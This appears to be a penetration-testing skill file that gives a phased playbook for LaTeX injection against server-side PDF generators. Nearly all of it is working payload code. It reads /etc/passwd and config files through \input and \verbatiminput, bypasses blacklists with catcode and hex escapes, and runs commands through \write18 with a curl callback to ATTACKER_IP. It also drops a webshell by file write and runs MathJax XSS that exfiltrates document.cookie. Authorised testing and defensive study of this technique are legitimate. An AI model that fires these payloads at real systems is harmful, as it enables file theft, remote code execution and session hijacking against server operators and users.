---
name: attack-latex-injection
description: "LaTeX injection exploitation — arbitrary file read via \\input/\\include, command execution via \\write18, local file write, and mathjax/URL-scheme XSS"
category: "web-application"
version: "1.0"
author: "cyberstrike-official"
tags:
  - latex
  - injection
  - rce
  - lfi
  - shell-escape
  - attack
tech_stack:
  - latex
  - pdflatex
  - texlive
  - mathjax
cwe_ids:
  - CWE-98
  - CWE-77
  - CWE-79
chains_with:
  - wstg-inpv-11.1
  - attack-ssrf
prerequisites: []
severity_boost:
  wstg-inpv-11.1: "\\input/\\include primitives are a direct LFI/RFI vector once injection into a compiled .tex document is confirmed"
  attack-ssrf: "Remote package/class loading during LaTeX compilation can be abused to trigger outbound requests from the build server"
---

# LaTeX Injection Exploitation

## Objective

Inject LaTeX control sequences into a document that gets compiled server-side (PDF generation, resume/report builders, CV templates) to read arbitrary local files, write files, or achieve command execution via shell-escape.

## Testing Methodology

### Phase 1: Identify Injection Point

```bash
# Any field later embedded verbatim into a .tex template before compilation:
# name fields, comments, "generate PDF" exports, CV/resume builders, invoice tools
curl -s -X POST "https://TARGET/api/generate-pdf" \
  -d 'name=TESTPROBE\textbf{bold}' -o probe.pdf
pdftotext probe.pdf - | grep -i "bold"   # bold rendered = raw LaTeX is interpreted
```

### Phase 2: Confirm Interpretation & Test Read Primitive

```tex
% Minimal canary — confirms \input is evaluated, not escaped
\input{/etc/hostname}
```

```bash
curl -s -X POST "https://TARGET/api/generate-pdf" \
  --data-urlencode 'name=\input{/etc/hostname}' -o canary.pdf
pdftotext canary.pdf -
```

### Phase 3: Arbitrary File Read

```tex
% Interpret file content as LaTeX (works well for simple text files)
\input{/etc/passwd}
\include{somefile}          % loads somefile.tex (no extension, no leading slash)

% Read a single-line file without needing valid LaTeX syntax inside it
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file

% Read a multi-line file, line by line
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file

% Read raw content WITHOUT interpreting it as LaTeX (best for arbitrary files,
% avoids compile errors from '$', '#', '_', '&', binary content)
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
\lstinputlisting{/etc/passwd}
```

```tex
% If injection point is past \begin{document} (no \usepackage allowed),
% deactivate special characters so \input works on files containing
% $, #, _, & or null bytes (e.g. reading source/config/perl scripts)
\catcode `\$=12
\catcode `\#=12
\catcode `\_=12
\catcode `\&=12
\input{/path/to/config.pl}
```

```tex
% Blacklist bypass: replace one character with its unicode hex escape
% ^^41 = 'A' (uppercase), ^^7e = '~' (hex digits must be lowercase)
\lstin^^70utlisting{/etc/passwd}
```

### Phase 4: Command Execution (`\write18` shell-escape)

```text
Requires shell-escape enabled on the compiler (pdflatex -shell-escape / \write18
not disabled). Many SaaS PDF-generation backends leave this on for convenience
(e.g. auto-fetching bibliography/graphics tools).
```

```tex
% stdout is not captured directly — redirect to a file, then \input it back
\immediate\write18{id > output}
\input{output}

% If special characters break compilation, base64-encode the output
\immediate\write18{env | base64 > test.tex}
\input{test.tex}

% Reverse shell via write18 (redirect to attacker listener)
\immediate\write18{curl http://ATTACKER_IP:8888/rce -d "$(id)"}

% Pipe-based shortcuts (some engines support these directly)
\input|id|base64
\input{|"/bin/hostname"}
```

```bash
# Deliver via the same injection field, then compile-trigger + retrieve output
curl -s -X POST "https://TARGET/api/generate-pdf" \
  --data-urlencode 'name=\immediate\write18{curl http://ATTACKER_IP:8888/rce?d=$(id|base64 -w0)}' \
  -o rce.pdf
```

### Phase 5: File Write

```tex
% Confirms write access to the compile working directory (webshell drop
% candidate if that directory is web-reachable)
\newwrite\outfile
\openout\outfile=shell.tex
\write\outfile{Hello-world}
\write\outfile{\immediate\write18{id}}
\closeout\outfile
\input{shell.tex}
```

### Phase 6: Cross-Site Scripting (rendered output / MathJax contexts)

```tex
\url{javascript:alert(document.domain)}
\href{javascript:alert(document.domain)}{click me}
```

```tex
% MathJax unicode extension: inject raw HTML/JS into math rendering
\unicode{<img src=1 onerror="fetch('https://ATTACKER_IP:8888/xss?c='+document.cookie)">}
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Remote command execution via `\write18` shell-escape | Critical (P1) |
| Arbitrary local file read (`/etc/passwd`, source, credentials/config) | Critical (P1) |
| Arbitrary file write into a web-reachable directory (webshell drop) | Critical (P1) |
| Blacklist bypass via catcode manipulation / unicode hex escapes | Medium (P3) |
| Stored/reflected XSS via `\href`/`\url`/MathJax unicode injection | Medium (P3) |
| LaTeX compile errors disclose server file paths / internal structure | Low (P4) |

## Evidence Requirements

- Injected field value and the resulting compiled PDF/HTML showing file content or command output
- For RCE: OOB callback or command output captured from `\write18`
- For file write: proof the written file is retrievable (path + response)
- Confirmation of whether `-shell-escape` is enabled (RCE) vs. read-only primitives available

## Tools

- `pdftotext` — extract text from generated PDF to verify injected content rendered
- `curl` — deliver payloads to the PDF/document generation endpoint
- Local `pdflatex`/`texlive` install — validate payload syntax offline before firing at target

## References

- [Hacking with LaTeX - Sebastian Neef](https://web.archive.org/web/20260209043241/https://0day.work/hacking-with-latex/)
- [Latex to RCE, Private Bug Bounty Program - Yasho](https://web.archive.org/web/20210117203905/https://medium.com/bugbountywriteup/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a)
- [Pwning coworkers thanks to LaTeX - scumjr](https://web.archive.org/web/20161130151956/https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)
- [Root Me - LaTeX Command Execution Lab](https://www.root-me.org/en/Challenges/App-Script/LaTeX-Command-execution)
